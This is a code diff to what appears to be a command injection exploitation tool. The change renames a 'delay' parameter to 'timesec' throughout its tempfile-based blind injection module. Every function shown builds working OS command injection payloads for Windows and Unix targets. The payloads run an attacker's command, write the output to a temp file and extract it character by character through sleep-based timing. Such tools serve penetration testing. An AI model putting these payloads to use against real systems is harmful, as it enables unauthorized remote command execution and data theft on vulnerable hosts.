@@ -24,7 +24,7 @@ The available "tempfile-based" payloads.
 """
 Tempfile-based decision payload (check if host is vulnerable).
 """
-def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
+def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
       pipe = "|"
@@ -33,7 +33,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "((Get-Content " + OUTPUT_TEXTFILE + ").length-1)\"')"
                 " do if %i==" +str(j) + " "
-                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\") "
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\") "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
@@ -48,7 +48,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
                 "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                 "((Get-Content " + OUTPUT_TEXTFILE + ").length-1)\"')"
                 " do if %i==" +str(j) + " "
-                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\") "
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\") "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
@@ -61,7 +61,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
                 "str1=${#str}" + separator +
                 "if [ " + str(j) + " -ne ${str1} ]" + separator +
                 "then sleep 0" + separator +
-                "else sleep " + str(delay) + separator +
+                "else sleep " + str(timesec) + separator +
                 "fi "
                 )
 
@@ -74,7 +74,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
                 "str1=${#str}" + separator +
                 "if [ " + str(j) + " -ne ${str1} ]" + separator +
                 "then sleep 0" + separator +
-                "else sleep " + str(delay) + separator +
+                "else sleep " + str(timesec) + separator +
                 "fi "
                 )
 
@@ -90,7 +90,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
                 "str=$(cat " + OUTPUT_TEXTFILE + ") " + separator +
                 "str1=${#str} " + separator +
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
-                "sleep " + str(delay) + " "
+                "sleep " + str(timesec) + " "
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -100,7 +100,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
       payload = (pipe +
                 "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + pipe + 
                 "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + pipe + "tr -d '\\n'" + pipe + "wc -c) ] " + separator +
-                "sleep " + str(delay) + " "
+                "sleep " + str(timesec) + " "
                 )  
     else:
       pass
@@ -110,7 +110,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
 """
 __Warning__: The alternative shells are still experimental.
 """
-def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
+def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
     if separator == "||" :
@@ -120,7 +120,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     if separator == "&&" :
@@ -134,7 +134,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else:  
@@ -145,7 +145,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
                 "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator +
                 "if [ " + str(j) + " -ne ${str1} ]" + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator +
+                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
@@ -157,7 +157,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
                 "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator +
                 "if [ " + str(j) + " -ne ${str1} ]" + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator +
+                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
@@ -173,7 +173,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
                 # Find the length of the output, using readline().
                 "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " + separator +
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
-                "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\") "
+                "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -184,7 +184,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
                 "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + " "
                 # Find the length of the output, using readline().
                 "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator +
-                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\") "
+                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 ) 
     else:
       pass
@@ -200,7 +200,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
 """
 Execute shell commands on vulnerable host.
 """
-def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method):
+def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
       pipe = "|"
@@ -212,7 +212,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                 "do if %i==" +str(j) + " "
-                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay + 1) + "\" " +
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\" " +
                 # Transform to ASCII
                 pipe + " "
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
@@ -234,7 +234,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                 "do if %i==" +str(j) + " "
-                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay + 1) + "\" " +
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\" " +
                 # Transform to ASCII
                 ampersand + ""
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
@@ -253,7 +253,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
                 "str1=${#str}" + separator +
                 "if [ " + str(j) + " != ${str1} ]" + separator +
                 "then sleep 0 " + separator +
-                "else sleep " + str(delay) + separator +
+                "else sleep " + str(timesec) + separator +
                 # Transform to ASCII
                 "str1=$(od -A n -t d1 < " +OUTPUT_TEXTFILE + ")" + separator +
                 "echo $str1 > " + OUTPUT_TEXTFILE + separator +
@@ -270,7 +270,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
                 "str1=${#str}" + separator +
                 "if [ " + str(j) + " != ${str1} ]" + separator +
                 "then sleep 0 " + separator +
-                "else sleep " + str(delay) + separator +
+                "else sleep " + str(timesec) + separator +
                 # Transform to ASCII
                 "str1=$(od -A n -t d1 < " +OUTPUT_TEXTFILE + ")" + separator +
                 "echo $str1 > " + OUTPUT_TEXTFILE + separator +
@@ -291,7 +291,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
                 # Find the length of the output.
                 "str1=${#str} " + separator +
                 "[ " + str(j) + " -eq ${str1} ]" + separator +
-                "sleep " + str(delay) + separator + " "
+                "sleep " + str(timesec) + separator + " "
                 # Transform to ASCII
                 "str1=$(od -A n -t d1 < " +OUTPUT_TEXTFILE + ")" + separator +
                 "echo $str1 > " + OUTPUT_TEXTFILE 
@@ -304,7 +304,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
       payload = (pipe +
                 "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " " + pipe + 
                 "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + pipe + "tr -d '\\n'" + pipe + "wc -c) ] " + separator +
-                "sleep " + str(delay) + " "
+                "sleep " + str(timesec) + " "
                 )                    
     else:
       pass
@@ -314,7 +314,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
 """
 __Warning__: The alternative shells are still experimental.
 """
-def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method):
+def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
     if separator == "||" :
@@ -327,7 +327,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     if separator == "&&" :
@@ -344,7 +344,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else: 
@@ -355,7 +355,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
                 "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator +
                 "if [ " + str(j) + " != ${str1} ] " + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator +
+                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
@@ -367,7 +367,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
                 "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator +
                 "if [ " + str(j) + " != ${str1} ] " + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator +
+                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )    
 
@@ -383,7 +383,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
                 # Find the length of the output, using readline().
                 "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " +  separator +
                 "[ " + str(j) + " -eq ${str1} ] " +  separator +
-                "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\") "
+                "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator) 
@@ -393,7 +393,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
       payload = (pipe +
                 "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + " "
                 "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator +
-                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\")"
+                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )                   
     else:
       pass
@@ -409,7 +409,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
 """
 Get the execution output, of shell execution.
 """
-def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method):
+def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
       pipe = "|"
@@ -417,7 +417,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" +str(num_of_chars-1)+ "]\"')"
                 " do if %i==" +str(ascii_char)+ " "
-                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay + 1) + "\")"
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\")"
                 )
 
     if separator == "&&" :
@@ -430,7 +430,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" +str(num_of_chars-1)+ "]\"')"
                 " do if %i==" +str(ascii_char)+ " "
-                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay + 1) + "\")"
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\")"
                 )
 
   else:
@@ -440,7 +440,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
                 "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE +  ")" + separator +
                 "if [ " +  str(ascii_char) + " != ${str} ]" + separator +
                 "then sleep 0" + separator +
-                "else sleep " + str(delay) + separator +
+                "else sleep " + str(timesec) + separator +
                 "fi "
                 )
 
@@ -451,7 +451,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
                 "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE +  ")" + separator +
                 "if [ " +  str(ascii_char) + " != ${str} ]" + separator +
                 "then sleep 0" + separator +
-                "else sleep " + str(delay) + separator +
+                "else sleep " + str(timesec) + separator +
                 "fi "
                 )
 
@@ -466,7 +466,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
                 # Use space as delimiter
                 "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE +  ")" + separator +
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
-                "sleep " + str(delay) + " "
+                "sleep " + str(timesec) + " "
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -475,7 +475,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
       pipe = "|"
       payload = (pipe +
                 "[ " + str(ascii_char) + " -ne  $(cat " + OUTPUT_TEXTFILE + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator +
-                "sleep " + str(delay) + " "
+                "sleep " + str(timesec) + " "
                 )
     else:
       pass
@@ -485,7 +485,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
 """
 __Warning__: The alternative shells are still experimental.
 """
-def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method):
+def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print ord(file.read().strip()[" + str(num_of_chars - 1) + "][0]); exit(0)\""
     if separator == "||" :
@@ -494,7 +494,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     if separator == "&&" :
@@ -507,7 +507,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
                 "for /f \"tokens=*\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else: 
@@ -516,7 +516,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
                 "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\")" + separator +
                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator +
+                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
@@ -526,7 +526,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
                 "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\")" + separator +
                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator +
+                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 ) 
 
@@ -540,7 +540,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
                 "$(python -c \"import time\ntime.sleep(0)\") " +  separator +
                 "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\") " +  separator +
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
-                "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\")"
+                "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -549,7 +549,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
       pipe = "|"
       payload = (pipe +
                 "[ " + str(ascii_char) + " -ne  $(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\") ] " + separator +
-                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\")"
+                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
     else:
       pass
@@ -564,7 +564,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
 """
 Get the execution output, of shell execution.
 """
-def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method):
+def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
       pipe = "|"
@@ -572,7 +572,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                 "do if %i==" + str(ord(str(ascii_char))) + " "
-                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\") "
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\") "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
@@ -586,7 +586,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
                 "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                 "do if %i==" + str(ord(str(ascii_char))) + " "
-                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\") "
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\") "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
@@ -596,7 +596,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
                 "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator +
                 "if [ " + str(ord(str(ascii_char))) + " != ${str} ]" + separator +
                 "then sleep 0" + separator +
-                "else sleep " + str(delay) + separator +
+                "else sleep " + str(timesec) + separator +
                 "fi "
                 )
 
@@ -606,7 +606,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
                 "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator +
                 "if [ " + str(ord(str(ascii_char))) + " != ${str} ]" + separator +
                 "then sleep 0" + separator +
-                "else sleep " + str(delay) + separator +
+                "else sleep " + str(timesec) + separator +
                 "fi "
                 )
 
@@ -620,7 +620,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
                 "sleep 0 " +  separator +
                 "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ") " + separator +
                 "[ " + str(ord(str(ascii_char))) + " -eq ${str} ] " +  separator +
-                "sleep " + str(delay) + " "
+                "sleep " + str(timesec) + " "
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -629,7 +629,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
       pipe = "|"
       payload = (pipe +
                 "[ " + str(ascii_char) + " -ne  $(cat " + OUTPUT_TEXTFILE + ") ] " + separator +
-                "sleep " + str(delay) + " "
+                "sleep " + str(timesec) + " "
                 )
     else:
       pass
@@ -639,7 +639,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
 """
 __Warning__: The alternative shells are still experimental.
 """
-def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method):
+def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print file.readlines()[0][" + str(num_of_chars - 1) + "]; exit(0)\""
     if separator == "||" :
@@ -648,7 +648,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     if separator == "&&" :
@@ -661,7 +661,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 "for /f \"tokens=*\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else: 
@@ -670,7 +670,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\")" + separator +
                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator +
+                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
@@ -680,7 +680,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\")" + separator +
                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator +
-                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator +
+                "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                 "fi "
                 )
 
@@ -694,7 +694,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 "$(python -c \"import time\ntime.sleep(0)\") " +  separator +
                 "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\") " +  separator +
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
-                "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\")"
+                "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -703,7 +703,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
       pipe = "|"
       payload = (pipe +
                 "[ " + str(ascii_char) + " -ne  $(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\") ] " + separator +
-                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\")"
+                "$(python -c \"import time\ntime.sleep(0)\")" + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
     else:
       pass
